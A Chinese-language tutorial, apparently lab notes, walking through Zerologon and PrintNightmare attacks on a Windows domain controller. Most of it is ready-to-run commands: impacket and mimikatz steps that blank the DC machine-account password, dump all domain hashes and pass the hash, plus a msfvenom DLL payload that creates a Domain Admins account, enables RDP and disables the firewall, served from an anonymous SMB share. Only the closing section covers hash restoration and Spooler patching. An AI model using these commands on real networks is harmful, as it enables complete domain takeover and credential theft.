<details open>
<summary>恢复域控的机器用户的原始哈希</summary>

在攻击成功后，一定要恢复域控的机器用户的原始哈希，不然可能会出现域控重启后无法开机、脱域等情况！其原因是将 ntds.dit 中的域控机器密码置为空了，但是域控本地注册表和 lsass 进程中的密码并没有改变，这就导致了机器用户在 AD 中的密码与本地的注册表和 lsass 进程里面的密码不一致，所以可能会出现域控重启后无法开机、脱域等情况。

</details>

### impacket 攻击

#### 检测是否存在漏洞

```bash
python3 zerologon_tester.py AD01 10.211.55.4
```

#### 重置域控哈希

```bash
#攻击，使域控的机器账号哈希置为空
python3 CVE-2020-1472.py AD01 AD01$ 10.211.55.4
```

#### 远程连接域控

```bash
#使用机器账号，哈希为空连接，导出 administrator 用户的哈希
python3 secretsdump.py "xie/AD01$"@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc-user "administrator"

#然后用 administrator 用户的哈希连接域控
python3 smbexec.py xie/administrator@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:33e17aa21ccc6ab0e6ff30eecb918dfb

#导出所有用户哈希
python3 secretsdump.py "xie/AD01$"@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc
```

### mimikatz 攻击

#### 检测是否存在漏洞

```shell
mimikatz.exe "privilege::debug" "lsadump::zerologon /target:10.211.55.4 /account:AD01$" "exit"
```

#### 重置域控哈希

***攻击机在域中:  
***如果当前主机在域环境中，则 target 这里可以直接使用 FQDN

```shell
mimikatz.exe "lsadump::zerologon /target:AD01.xie.com /ntlm /null /account:AD01$ /exploit" "exit"
```

***攻击机不在域中:  
***如果当前主机不在域环境中，则 target 这里可以直接指定 ip

```shell
mimikatz.exe "lsadump::zerologon /target:10.211.55.4 /ntlm /null /account:AD01$ /exploit" "exit"
```

#### 远程连接域控

注意：这里/dc 后面一定要跟域名格式的域控的 FQDN，即当前攻击的机器必须将 DNS 服务器指为域控，这样才能解析

```shell
#导出指定 administrator 用户哈希
mimikatz.exe "lsadump::dcsync /csv /domain:xie.com /dc:AD01.xie.com /user:administrator /authuser:AD01$ /authpassword:\"\" /authntlm" "exit"

#然后用 administrator 用户的哈希连接域控，需要 privilege::debug 提权
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:10.211.55.4 /rc4:33e17aa21ccc6ab0e6ff30eecb918dfb" "exit"
```

### 恢复域控的机器用户哈希

#### 获得域控机器账号原始哈希

方式一：  
在目标域控上执行这三个命令，将注册表中的信息导出这三个文件

```shell
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
```

将刚刚保存的三个文件放到 impacket 的 examples 目录下，使用secretsdump 提取出文件里面的 hash。

```bash
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

`$MACHINE.ACC`后面的就是原来的机器哈希

方式二：  
使用 mimikatz 的 sekurlsa::logonpassword 从 lsass.exe 进程里面抓取

```shell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1743327542697-6046ec99-562f-4fda-a7c5-7bdec943aeed.png)

#### 恢复域控原始哈希

方式一：

再打一次，直接使用机器账号的原始 NTLM 哈希即可还原，执行如下命令恢复：

```bash
#恢复域控哈希
python3 reinstall_original_pw.py AD01 10.211.55.4 7a3923eba00414ed996df8f03c5cb7bb

#python3 secretsdump.py xie.com/administrator@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:33e17aa21ccc6ab0e6ff30eecb918dfb -just-dc-user "AD01$"
```

方式二：

可以使用 mimikatz 抓出来的 hexpass，使用 restorepassword.py 脚本恢复。（hexpass需要去掉所有空格）

```bash
python3 restorepassword.py xie.com/AD01@AD01 -target-ip 10.211.55.4 -hexpass <Hex_Password>
```

方式三：

直接在域控上执行该命令， 该命令一次性重置计算机的机器帐户密码。(包括 AD，注册表，lsass 里面的密码)。 重置后的密码跟之前的密码不一样。

```shell
powershell Reset-ComputerMachinePassword
```

### 检测是否存在漏洞

检测目标机器是否开启 MS-RPRN 服务，存在即可以尝试利用

```bash
python3 rpcdump.py @10.211.55.14 | grep MS-RPRN
```

### 创建恶意 dll 文件

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1743562668045-bdfd724a-1cc6-44d9-90cd-8e7981ae376c.png)

也可以使用 msf 生成的 dll，来创建用户、关闭防火墙，开启 rdp。

```bash
msfvenom -p windows/x64/exec EXITFUNC=thread CMD='cmd.exe /c net user dcadmin 1qaz@WSX!@#4 /ADD && net group "Domain admins" dcadmin /ADD && REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f && netsh advfirewall set all profiles state off' -f dll > dcadmin.dll
```

> -   `EXITFUNC=thread`：确保负载通过线程退出来干净地退出。
> -   `CMD='cmd.exe /c ...'`：这是将要在目标机器上执行的命令。多个命令通过 `&&` 分隔，逐个执行：
> -   `net user dcadmin 1qaz@WSX!@#4 /ADD`：创建一个新用户 `dcadmin`，密码为 `1qaz@WSX!@#4`。
> -   `net group "Domain admins" dcadmin /ADD`：将新用户添加到 "Domain admins"（域管理员）组。
> -   `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`：修改 Windows 注册表，允许远程桌面连接。
> -   `netsh advfirewall set all profiles state off`：关闭所有防火墙配置（包括公用、私用和域配置）。

### 创建匿名 SMB 共享

*Linux创建匿名共享：*

安装 smbd 服务，Kali 默认安装。改 SMB 配置文件/etc/samba/smb.conf，将恶意 dll 放在`/tmp`目录下，然后启动 SMB 服务。共享路径为：\\\\Linux 机器ip\\smb\\1.dll

```bash
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
smb ports = 445

[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
```
```bash
service smbd start
```

*Windows创建匿名共享：*

注：创建匿名共享的 Windows 服务器不需要在域内，但是该机器的防火墙需开放445 端口

在目标机器上以管理员权限运行 cmd

```shell
# 在C盘下创建一个名为share的文件夹，然后将1.dll传入该文件夹。
mkdir C:\share
# 创建一个名为 share 的共享文件夹，共享路径是 C:\share，并且允许其匿名登录。
icacls C:\share\ /T /grant "ANONYMOUS LOGON":r
icacls C:\share\ /T /grant Everyone:r
powershell.exe New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
```

有些机器(Win7/Server2008 等)没有powershell语句则需要RDP登录目标主机，找到 C:\\share，右键-  
\>属性

### 使用 python 脚本攻击

需要任意一个有效的域账号密码

脚本会将恶意 dll 文件传到域控的`C:\Windows\System32\spool\drivers\x64\3\`目录下并执行

```shell
python3 CVE-2021-1675.py xie.com/test:P@ss1234@10.211.55.14 '\\10.211.55.7\share\1.dll'
```

### 使用 mimikatz 攻击

需要在当前域内

```shell
mimikatz.exe "misc::printnightmare /server:10.211.55.14 /library:\\10.211.55.7\share\1.dll"
```

Windows Server2016、2019 均能成功上线。Server2012 只能上传恶意 dll，不能执行上线。

### 报错

如果出现如下报错 DCERPC Runtime Error: code: 0x5 -rpc\_s\_access\_denied，则是因为无法匿名访问该 dll 文件。

### 漏洞防护

**补丁包升级：**

[Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

**临时防护措施：**

在服务应用（services.msc）中禁用 Print Spooler 服务

或者可以通过 powershell 命令关闭 Spooler 服务并设置为禁用。

```powershell
#获得 Spooler 服务的状态
Get-Service -Name Spooler
#强制关闭 Spooler 服务
Stop-Service -Name Spooler -Force
#设置 Spooler 服务为禁用
Set-Service -Name Spooler -StartupType Disabled
```
